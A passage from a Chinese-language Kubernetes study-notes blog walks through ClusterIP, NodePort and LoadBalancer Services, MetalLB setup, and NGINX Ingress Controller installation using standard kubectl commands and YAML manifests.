让外部访问集群内部的服务。</li><li>当前阶段可暂不深入学习，日后有时间再了解。</li></ol></li><li>&#x3D;&#x3D;当前主流&#x3D;&#x3D;：<ol><li>对于集群内部通信（即 Pod 之间的访问），选择 <code>ClusterIP</code>。</li><li>若需将服务暴露给外部访问，或者在云平台上运行，选择 <code>LoadBalancer</code>。</li><li>若集群内部需要访问外部服务，则选择 <code>ExternalName</code>。</li></ol></li></ol><hr><h5 id="10-5-2-ClusterIP-Service-实战步骤"><a href="#10-5-2-ClusterIP-Service-实战步骤" class="headerlink" title="10.5.2. ClusterIP Service 实战步骤"></a>10.5.2. ClusterIP Service 实战步骤</h5><p>&#x3D;&#x3D;1.编写 ClusterIP Service 资源 yaml 文件&#x3D;&#x3D;</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">my-clusterip-service</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">default</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">ClusterIP</span>                                  <span class="hljs-comment"># 指定 Service 类型为 ClusterIP</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">my-app</span>                                    <span class="hljs-comment"># 选择标签为 app=my-app 的 Pod</span><br>  <span class="hljs-attr">ports:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">port:</span> <span class="hljs-number">80</span>                                     <span class="hljs-comment"># Service 暴露的端口（Serivce Port）</span><br>      <span class="hljs-attr">targetPort:</span> <span class="hljs-number">8080</span>                             <span class="hljs-comment"># 容器内应用监听的端口</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.创建 CluserIP Service 资源&#x3D;&#x3D;</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">kubectl apply -f <span class="hljs-keyword">my</span>-clusterip-service.yaml<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.检查 ClusterIP Service 资源状态&#x3D;&#x3D;</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 检查状态的同时，也可获取 Service IP</span><br>kubectl <span class="hljs-built_in">get</span><span class="hljs-built_in"> service </span>&lt;service-name&gt; -n &lt;service-namespace&gt;<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;4.内部访问 Pod&#x3D;&#x3D;</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-comment"># 1. 查询 Service IP 和 Service Port</span><br>kubectl get service <span class="hljs-symbol">&lt;service-name&gt;</span> <span class="hljs-operator">-</span>n <span class="hljs-symbol">&lt;namespace&gt;</span><br><br><br><span class="hljs-comment"># 2. 随便找到运行中的 Pod</span><br>kubectl get pod <span class="hljs-operator">-</span>n <span class="hljs-symbol">&lt;namespace&gt;</span><br><br><br><span class="hljs-comment"># 3. 进入到该 Pod 中</span><br>kubectl exec <span class="hljs-operator">-</span>it <span class="hljs-symbol">&lt;Pod-name&gt;</span> <span class="hljs-operator">-</span>- <span class="hljs-symbol">/bin/bash</span><br><br><br><span class="hljs-comment"># 4. 内部访问 Pod</span><br>curl http:<span class="hljs-operator">//</span><span class="hljs-symbol">&lt;service-name&gt;</span>.<span class="hljs-symbol">&lt;service-namespace&gt;</span>.svc.cluster.local<br>curl http:<span class="hljs-operator">//</span><span class="hljs-symbol">&lt;service-ip&gt;</span>:<span class="hljs-symbol">&lt;service-port&gt;</span><br></code></pre></td></tr></table></figure><hr><h5 id="10-5-3-NodePort-Service-实战步骤"><a href="#10-5-3-NodePort-Service-实战步骤" class="headerlink" title="10.5.3. NodePort Service 实战步骤"></a>10.5.3. NodePort Service 实战步骤</h5><p>&#x3D;&#x3D;1.编写 NodePort Service 资源 yaml 文件&#x3D;&#x3D;</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">my-nodeport-service</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">NodePort</span>                                             <span class="hljs-comment"># 通过宿主机的 NodePort 访问</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">my-app</span><br>  <span class="hljs-attr">ports:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">port:</span> <span class="hljs-number">80</span>                                               <span class="hljs-comment"># Service 暴露的端口</span><br>      <span class="hljs-attr">targetPort:</span> <span class="hljs-number">8080</span>                                       <span class="hljs-comment"># 容器内应用监听的端口</span><br>      <span class="hljs-attr">nodePort:</span> <span class="hljs-number">30080</span>                                        <span class="hljs-comment"># Pod 所在 Node 上暴露的端口(NodePort)</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.创建 NodePort Service 资源&#x3D;&#x3D;</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">kubectl <span class="hljs-built_in">apply</span> -f your-service.yaml<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.检查 NodePort Service 资源状态&#x3D;&#x3D;</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 检查状态的同时，也可获取 Service IP</span><br>kubectl <span class="hljs-built_in">get</span><span class="hljs-built_in"> service </span>&lt;service-name&gt; -n &lt;service-namespace&gt;<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;4.内部访问 Pod&#x3D;&#x3D;</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-comment"># 1. 查询 Service IP 和 Service Port</span><br>kubectl get service <span class="hljs-symbol">&lt;service-name&gt;</span> <span class="hljs-operator">-</span>n <span class="hljs-symbol">&lt;namespace&gt;</span><br><br><br><span class="hljs-comment"># 2. 随便找到运行中的 Pod</span><br>kubectl get pod <span class="hljs-operator">-</span>n <span class="hljs-symbol">&lt;namespace&gt;</span><br><br><br><span class="hljs-comment"># 3. 进入到该 Pod 中</span><br>kubectl exec <span class="hljs-operator">-</span>it <span class="hljs-symbol">&lt;Pod-name&gt;</span> <span class="hljs-operator">-</span>- <span class="hljs-symbol">/bin/bash</span><br><br><br><span class="hljs-comment"># 4. 内部访问 Pod</span><br>curl http:<span class="hljs-operator">//</span><span class="hljs-symbol">&lt;service-name&gt;</span>.<span class="hljs-symbol">&lt;service-namespace&gt;</span>.svc.cluster.local<br>curl http:<span class="hljs-operator">//</span><span class="hljs-symbol">&lt;service-ip&gt;</span>:<span class="hljs-symbol">&lt;service-port&gt;</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;5.外部访问 Pod&#x3D;&#x3D;</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">curl <span class="hljs-symbol">http:</span>//&lt;node-ip&gt;<span class="hljs-symbol">:&lt;node-port&gt;</span><br></code></pre></td></tr></table></figure><hr><h5 id="10-5-4-LoadBalancer-Service（MetalLB）实战步骤"><a href="#10-5-4-LoadBalancer-Service（MetalLB）实战步骤" class="headerlink" title="10.5.4. LoadBalancer Service（MetalLB）实战步骤"></a>10.5.4. LoadBalancer Service（MetalLB）实战步骤</h5><h6 id="10-5-4-1-安装-MetalLB"><a href="#10-5-4-1-安装-MetalLB" class="headerlink" title="10.5.4.1. 安装 MetalLB"></a>10.5.4.1. 安装 MetalLB</h6><p>&#x3D;&#x3D;1.开启 ARP 模式&#x3D;&#x3D;<br>仅需在当前 Master 节点启用 ARP 模式即可</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment"># 1. 编辑 kube-proxy 配置文件</span><br>kubectl edit configmap -n kube-<span class="hljs-keyword">system</span> kube-proxy<br><br><br><span class="hljs-comment"># 2. 修改 ipvs.strictARP 为 true</span><br>strictARP: <span class="hljs-literal">false</span>  -&gt; strictARP: <span class="hljs-literal">true</span><br><br><br><span class="hljs-comment"># 3. 重启 Kube-proxy pod</span><br>kubectl rollout restart daemonset -n kube-<span class="hljs-keyword">system</span> kube-proxy<br></code></pre></td></tr></table></figure><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AK8s/image-20250404155459306.png"></p><p>&#x3D;&#x3D;2.安装 MetalLB&#x3D;&#x3D;</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 1. 查询 K8S 版本</span><br>kubectl version<br><br><br><span class="hljs-comment"># 2. 安装适配 K8S 版本的 MetalLB（这里适配 1.28.2 版本的 K8S）</span><br>kubectl apply -f https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/metallb/m</span>etallb<span class="hljs-regexp">/v0.14.9/</span>config<span class="hljs-regexp">/manifests/m</span>etallb-native.yaml<br><br><br><span class="hljs-comment"># 3. 补充：删除 MetalLB</span><br>kubectl <span class="hljs-keyword">delete</span> -f https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/metallb/m</span>etallb<span class="hljs-regexp">/v0.14.9/</span>config<span class="hljs-regexp">/manifests/m</span>etallb-native.yaml<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项：资源清单中的主要内容</p><ol><li>资源清单中的内容主要包括：<ul><li><font color="#00b0f0">创建命名空间</font>：<ul><li>创建 <code>metallb-system</code> 命名空间，隔离 MetalLB 资源。</li></ul></li><li><font color="#00b0f0">定义 CRD（自定义资源）</font><ul><li><code>IPAddressPool</code>：IP 地址池。</li><li><code>L2Advertisement</code>：Layer2 广播配置。</li><li><code>BGPAdvertisement</code>：BGP 广播配置（BGP 模式下）。</li></ul></li><li><font color="#00b0f0">创建 RBAC 权限</font><ul><li>使用 <code>ServiceAccount</code>、<code>ClusterRole</code> 和 <code>ClusterRoleBinding</code>，保证 MetalLB 能访问集群资源。</li></ul></li><li><font color="#00b0f0">部署核心组件</font><ul><li><code>Controller</code>（Deployment）：负责将 MetalLB 配置资源（如 IP 池）同步到 Kubernetes。</li><li><code>Speaker</code>（DaemonSet）：负责监听 Service 变化并向外部广播 IP 地址。</li></ul></li><li><font color="#00b0f0">创建 Service</font><ul><li>用于暴露 webhook 服务。</li></ul></li></ul></li><li>资源清单的示例：<a href="https://raw.githubusercontent.com/metallb/metallb/v0.14.3/config/manifests/metallb-native.yaml">MetalLB 资源清单示例</a></li></ol></blockquote><p>&#x3D;&#x3D;3.查看 MetalLB 状态&#x3D;&#x3D;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">kubectl <span class="hljs-keyword">get</span> <span class="hljs-keyword">all</span> <span class="hljs-operator">-</span>n metallb<span class="hljs-operator">-</span><span class="hljs-keyword">system</span><br></code></pre></td></tr></table></figure><hr><h6 id="10-5-4-2-配置-IP-地址池"><a href="#10-5-4-2-配置-IP-地址池" class="headerlink" title="10.5.4.2. 配置 IP 地址池"></a>10.5.4.2. 配置 IP 地址池</h6><p>&#x3D;&#x3D;1.编写 IPAddressPool 资源 yaml 文件&#x3D;&#x3D;</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> metallb.io<span class="hljs-symbol">/v1beta1</span><br><span class="hljs-params">kind:</span> IPAddressPool<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> public-ips <br>  <span class="hljs-params">namespace:</span> metallb-system                      <span class="hljs-comment"># 命名空间，要为 metallb-system</span><br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">addresses:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">136.20</span>0-<span class="hljs-number">192.168</span>.<span class="hljs-number">136.250</span>              <span class="hljs-comment"># 分配的 IP 范围</span><br>  <span class="hljs-params">autoAssign:</span> <span class="hljs-literal">true</span>                               <span class="hljs-comment"># 自动分配 IP</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项：IP 范围</p><ol><li>这里配置的 IP 范围用于自动为 LoadBalancer 类型 Service 分配 VIP。也就是说，创建该类型的 Service 后，MetalLB 会从此范围内自动挑选一个 IP 地址作为其 VIP</li></ol></blockquote><p>&#x3D;&#x3D;2.创建 IPAddressPool 资源&#x3D;&#x3D;</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">kubectl</span> apply -f <span class="hljs-built_in">ip</span>-pool.yaml<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.检查 IPAddressPool 资源状态&#x3D;&#x3D;</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">kubectl <span class="hljs-built_in">get</span> ipaddresspool -n metallb-<span class="hljs-keyword">system</span><br></code></pre></td></tr></table></figure><hr><h6 id="10-5-4-3-配置-L2-广播"><a href="#10-5-4-3-配置-L2-广播" class="headerlink" title="10.5.4.3. 配置 L2 广播"></a>10.5.4.3. 配置 L2 广播</h6><p>&#x3D;&#x3D;1.编写 L2Advertisement 资源 yaml 文件&#x3D;&#x3D;</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> metallb.io<span class="hljs-symbol">/v1beta1</span><br><span class="hljs-params">kind:</span> L2Advertisement<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> l2-advert<br>  <span class="hljs-params">namespace:</span> metallb-system         <span class="hljs-comment"># 命名空间，要为 metallb-system</span><br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">ipAddressPools:</span>                   <span class="hljs-comment"># 使用的 IP 地址池</span><br>  <span class="hljs-operator">-</span> public-ips                      <span class="hljs-comment"># IP 池的名称</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>简单来说，只有在配置了 L2 广播的情况下，Service 才会自动分配地址，否则不会分配。</li></ol></blockquote><p>&#x3D;&#x3D;2.创建 L2Advertisement 资源&#x3D;&#x3D;</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">kubectl <span class="hljs-built_in">apply</span> -f l2-advert.yaml<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.检查 L2Advertisement 资源状态&#x3D;&#x3D;</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">kubectl <span class="hljs-built_in">get</span> l2advertisement -n metallb-<span class="hljs-keyword">system</span><br></code></pre></td></tr></table></figure><hr><h6 id="10-5-4-4-创建-LoadBalancer-Service-资源"><a href="#10-5-4-4-创建-LoadBalancer-Service-资源" class="headerlink" title="10.5.4.4. 创建 LoadBalancer Service 资源"></a>10.5.4.4. 创建 LoadBalancer Service 资源</h6><p>&#x3D;&#x3D;1.编写 LoadBalancer Service 资源 yaml 文件&#x3D;&#x3D;</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">my-web</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">my-web-app</span><br>  <span class="hljs-attr">ports:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">http</span><br>      <span class="hljs-attr">protocol:</span> <span class="hljs-string">TCP</span><br>      <span class="hljs-attr">port:</span> <span class="hljs-number">80</span><br>      <span class="hljs-attr">targetPort:</span> <span class="hljs-number">8080</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">LoadBalancer</span>                  <span class="hljs-comment"># 使用负载均衡器类型</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.创建 LoadBalancer Service 资源&#x3D;&#x3D;</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">kubectl apply -f <span class="hljs-keyword">my</span>-loadbalancer-service.yaml<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.检查 LoadBalancer Service 资源状态&#x3D;&#x3D;</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">kubectl <span class="hljs-keyword">get</span> svc <span class="hljs-keyword">my</span>-web -o wide<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;4.内部访问 Pod&#x3D;&#x3D;</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-comment"># 1. 查询 Service IP 和 Service Port</span><br>kubectl get service <span class="hljs-symbol">&lt;service-name&gt;</span> <span class="hljs-operator">-</span>n <span class="hljs-symbol">&lt;namespace&gt;</span><br><br><br><span class="hljs-comment"># 2. 随便找到运行中的 Pod</span><br>kubectl get pod <span class="hljs-operator">-</span>n <span class="hljs-symbol">&lt;namespace&gt;</span><br><br><br><span class="hljs-comment"># 3. 进入到该 Pod 中</span><br>kubectl exec <span class="hljs-operator">-</span>it <span class="hljs-symbol">&lt;Pod-name&gt;</span> <span class="hljs-operator">-</span>- <span class="hljs-symbol">/bin/bash</span><br><br><br><span class="hljs-comment"># 4. 内部访问 Pod</span><br>curl http:<span class="hljs-operator">//</span><span class="hljs-symbol">&lt;service-name&gt;</span>.<span class="hljs-symbol">&lt;service-namespace&gt;</span>.svc.cluster.local<br>curl http:<span class="hljs-operator">//</span><span class="hljs-symbol">&lt;service-ip&gt;</span>:<span class="hljs-symbol">&lt;service-port&gt;</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;5.外部访问 Pod&#x3D;&#x3D;</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">curl <span class="hljs-symbol">http:</span>//&lt;<span class="hljs-title class_">VIP</span>&gt;<span class="hljs-symbol">:&lt;service-port&gt;</span><br></code></pre></td></tr></table></figure><hr><h5 id="10-5-5-补充：查看-Service-IP"><a href="#10-5-5-补充：查看-Service-IP" class="headerlink" title="10.5.5. 补充：查看 Service IP"></a>10.5.5. 补充：查看 Service IP</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">kubectl <span class="hljs-built_in">get</span><span class="hljs-built_in"> service </span>&lt;service-name&gt; -n namespace<br></code></pre></td></tr></table></figure><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AK8s/image-20250404145519072.png"></p><ol><li>&#x3D;&#x3D;Cluster-IP&#x3D;&#x3D;：<ol><li>可以理解为 <code>Service IP</code>，它不是某个具体主机的物理 IP，而是由 Kubernetes 提供的虚拟 IP。</li></ol></li><li>&#x3D;&#x3D;EXTERNAL-IP&#x3D;&#x3D;：<ol><li>可以理解为 VIP，由 MetalLB 或云服务商为 <code>LoadBalancer</code> 类型的 Service 自动分配。</li></ol></li><li>&#x3D;&#x3D;PORT(S)&#x3D;&#x3D;：<ol><li>可以理解为 <code>Service Port</code>，是 <code>Service</code> 暴露出的端口</li></ol></li><li>&#x3D;&#x3D;SELECTOR&#x3D;&#x3D;：<ol><li>Service 将请求负载均衡到匹配的 Pod。</li></ol></li></ol><hr><h4 id="10-6-Ingress-实战步骤"><a href="#10-6-Ingress-实战步骤" class="headerlink" title="10.6. Ingress 实战步骤"></a>10.6. Ingress 实战步骤</h4><h5 id="10-6-1-Ingress-的类型"><a href="#10-6-1-Ingress-的类型" class="headerlink" title="10.6.1. Ingress 的类型"></a>10.6.1. Ingress 的类型</h5><p><code>Ingress</code> 是用于<strong>定义域名路由规则</strong>的资源，但它本身不具备流量转发能力。要让流量真正转发到对应的服务，<strong>还需要部署</strong> <code>Ingress Controller Pod</code> 来执行实际的流量转发。常见的 Ingress Controller 有：</p><ol><li>&#x3D;&#x3D;NGINX Ingress Controller&#x3D;&#x3D;</li><li>&#x3D;&#x3D;Traefik&#x3D;&#x3D;</li><li>&#x3D;&#x3D;HAProxy&#x3D;&#x3D;</li><li>&#x3D;&#x3D;Istio Gateway&#x3D;&#x3D;</li></ol><blockquote><p>[!NOTE] 注意事项</p><ol><li>这些 Controller 本质上都是运行在集群中的 Pod，它们会自动监听集群内的 <code>Ingress</code> 资源，并根据配置规则执行流量转发</li><li>要先部署 <code>Ingress Controller</code> 再创建 <code>Ingress</code> 资源（☆☆☆）</li></ol></blockquote><hr><h5 id="10-6-2-NGINX-Ingress-Controller-实战步骤"><a href="#10-6-2-NGINX-Ingress-Controller-实战步骤" class="headerlink" title="10.6.2. NGINX Ingress Controller 实战步骤"></a>10.6.2. NGINX Ingress Controller 实战步骤</h5><h6 id="10-6-2-1-安装metalab"><a href="#10-6-2-1-安装metalab" class="headerlink" title="10.6.2.1. 安装metalab"></a>10.6.2.1. 安装metalab</h6><p>见上文：K8S 核心概念：K8S 网络 &#x2F; Service 实战步骤 &#x2F; LoadBalancer Service（MetalLB）实战步骤</p><hr><h6 id="10-6-2-2-安装-Nginx-Ingress-Controller"><a href="#10-6-2-2-安装-Nginx-Ingress-Controller" class="headerlink" title="10.6.2.2. 安装 Nginx Ingress Controller"></a>10.6.2.2. 安装 Nginx Ingress Controller</h6><p>&#x3D;&#x3D;1.安装 Nginx Ingress Controller&#x3D;&#x3D;</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 1. 查询 K8S 版本</span><br>kubectl version<br><br><br><span class="hljs-comment"># 2. 安装适配 K8s 版本的 Nginx Ingress Controller（这里适配 1.28.2 版本的 K8S）</span><br>kubectl apply -f https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/kubernetes/i</span>ngress-nginx<span class="hljs-regexp">/controller-v1.8.4/</span>deploy<span class="hljs-regexp">/static/</span>provider<span class="hljs-regexp">/cloud/</span>deploy.yaml<br><br><br><span class="hljs-comment"># 3. 补充：删除 Nginx Ingress Controller</span><br>kubectl <span class="hljs-keyword">delete</span> -f https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/kubernetes/i</span>ngress-nginx<span class="hljs-regexp">/controller-v1.8.4/</span>deploy<span class="hljs-regexp">/static/</span>provider<span class="hljs-regexp">/cloud/</span>deploy.yaml<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>部署时需根据 K8S 版本选择与之匹配的 NGINX Ingress Controller 资源清单，确保兼容性（☆☆☆）</li><li>资源清单中的内容主要包括：<ul><li><font color="#00b0f0">创建命名空间</font>：<ul><li>在集群中创建 <code>ingress-nginx</code> 命名空间，隔离 NGINX Ingress 资源</li></ul></li><li><font color="#00b0f0">创建 RBAC 权限</font>：<ul><li>使用 <code>ServiceAccount</code>、<code>ClusterRole</code> 和 <code>ClusterRoleBinding</code>，确保 NGINX Ingress 能访问集群资源</li></ul></li><li><font color="#00b0f0">部署核心组件</font>：<ul><li><code>Controller</code>（Deployment）：负责监听 Ingress 资源，将外部请求根据域名规则转发至对应的应用 Service。</li></ul></li><li><font color="#00b0f0">创建 Service</font>：<ul><li>用于管理 NGINX Ingress Pod 并对外暴露流量入口。</li></ul></li></ul></li><li>资源清单示例：<a href="https://raw.githubusercontent.com/kubernetes/ingress-nginx/main/deploy/static/provider/baremetal/deploy.yaml">Nginx Ingress Controller 资源清单示例</a></li><li>版本资源对照列表：<a href="https://gitcode.com/gh_mirrors/in/ingress-nginx?utm_source=csdn_github_accelerator">版本资源对照列表</a></li></ol></blockquote><p>&#x3D;&#x3D;2.检查 Nginx Ingress Controller 状态&#x3D;&#x3D;</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">kubectl <span class="hljs-keyword">get</span> <span class="hljs-keyword">all</span> -n ingress-nginx<br></code></pre></td></tr></table></figure><hr><h6 id="10-6-2-3-Ingress-域名路由配置"><a href="#10-6-2-3-Ingress-域名路由配置" class="headerlink" title="10.6.2.3. Ingress 域名路由配置"></a>10.6.2.3. Ingress 域名路由配置</h6><p>&#x3D;&#x3D;1.编写 Ingress 资源 yaml 文件&#x3D;&#x3D;</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> networking.k8s.io<span class="hljs-symbol">/v1</span><br><span class="hljs-params">kind:</span> Ingress<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> demo-ingress                          <span class="hljs-comment"># Ingress 的名称</span><br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">ingressClassName:</span> nginx                     <span class="hljs-comment"># 使用的 Ingress Controller 这里是 Nginx Ingress</span><br>  <br>  <span class="hljs-params">rules:</span>                                      <span class="hljs-comment"># 定义具体的流量路由规则</span><br>    <span 